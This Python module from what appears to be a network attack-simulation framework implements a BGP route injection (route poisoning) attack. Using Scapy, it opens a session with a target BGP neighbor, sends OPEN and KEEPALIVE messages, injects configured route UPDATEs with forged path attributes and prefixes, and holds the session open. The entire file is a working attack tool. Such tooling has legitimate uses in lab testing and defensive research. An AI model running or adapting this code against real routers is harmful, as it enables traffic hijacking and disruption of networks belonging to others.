import logging
from time import sleep
from scapy.sendrecv import send
from scapy.contrib.bgp import *
from scapy.supersocket import StreamSocket
from scapy.all import Raw

from libs.aux_funcs import type_wrapper, attack_type, attack_cat, attack_layer, EXIT_SIGNAL
  


@type_wrapper(name="BGP Injection", type=attack_type.RoutePoisoning, category = attack_cat.Attack, layer = attack_layer.L3_BGP, arg_list=[])
def BGP_route_injection(args:dict):

    """Perfoms a BGP route injection attack. Establishes a BGP session with the target and injects imported information.
    Requires no additional arguments."""

    # Get BGP information from the args variable
    raw_info = args['bgp_info']['bgp']

    # Variable assignment
    asn = raw_info['asn']
    neighbor_ip = raw_info['target_ip']
    dest_port = raw_info['dest_port']
    bgp_id = raw_info['bgp_id']

    logging.debug("Creating TCP socket...")
    # Create socket, perform TCP handshake
    s = socket.socket()
    s.connect((neighbor_ip,dest_port))

    # Transform socket to Scapy StreamSocket
    ss = StreamSocket(s, Raw)

    # Send BGP OPEN message
    logging.debug("Sending BGP OPEN...")
    ss.sr1(BGPHeader(type=1)/BGPOpen(my_as=asn, hold_time=180, bgp_id=bgp_id))
    sleep(1)

    # Send KEEPALIVE
    logging.debug("Sending first KEEPALIVE...")
    ss.sr1(BGPHeader(type=4))
    sleep(1)

    # Send UPDATE(S)
    logging.debug("Sending BGP UPDATES...")
    for update_entry in raw_info['update-list']:
        wthd_rts = _BGP_parse_nlri(update_entry['withdrawn_routes'])
        pth_attr = _BGP_parse_path_attr(update_entry['path_attributes'])
        nlri = _BGP_parse_nlri(update_entry['nlri'])

        if wthd_rts == None:
            pkt = BGPHeader(type=2)/BGPUpdate(path_attr=pth_attr, nlri=nlri)
        elif nlri == None:
            pkt = BGPHeader(type=2)/BGPUpdate(withdrawn_routes=wthd_rts, path_attr=pth_attr)
        else:
            pkt = BGPHeader(type=2)/BGPUpdate(withdrawn_routes=wthd_rts, path_attr=pth_attr, nlri=nlri)

        ss.sr1(pkt)
        sleep(0.5)
    sleep(2)

    # Loop send KEEPALIVE every 60 seconds
    while not EXIT_SIGNAL.is_set():
        logging.debug("Sending KEEPALIVE...")
        ss.sr1(BGPHeader(type=4))
        sleep(60)
    
    logging.debug("Stopping BGP Injection...")
    return args

#################
#   AUX FUNCTIONS
#################



##################
# _BGP_parse_path_attr()
# Parses Path Attributes from the python format to the scapy packet format
##################
def _BGP_parse_path_attr(raw_attr):
    path_at = []

    for rpa in raw_attr:
        type_code = rpa['type']
        pa = BGPPathAttr(type_flags=rpa['flags'], type_code=type_code)

        if type_code == 1: # ORIGIN
            pa.attribute = BGPPAOrigin(origin = rpa['attribute'])

        elif type_code == 2: # AS_PATH
            pa.attribute = BGPPAASPath(segments = [BGPPAASPath.ASPathSegment(segment_type=rpa['seg_type'],segment_length=rpa['seg_len'],segment_value=rpa['seg_val'])])

        elif type_code == 3: # NEXT_HOP
            pa.attribute = BGPPANextHop(next_hop=rpa['next_hop'])

        elif type_code == 4: # Multi Exit Discriminator
            pa.attribute = BGPPAMultiExitDisc(med=rpa['med'])

        else:
            #TODO add other attributes. Right now the function covers most important and common attributes.
            # Other attributes to handle include BGP extensions and support for 4-byte ASNs
            pass

        path_at.append(pa)

    return path_at

##################
# _BGP_parse_nlri()
# Parses Routes from the python format to the scapy packet format
##################
def _BGP_parse_nlri(raw_nlri):
    nlri = []
    if len(raw_nlri) == 0: return None
    for raw_prefix in raw_nlri:
        prefix = BGPNLRI_IPv4(prefix = raw_prefix['prefix'])
        nlri.append(prefix)

    return nlri
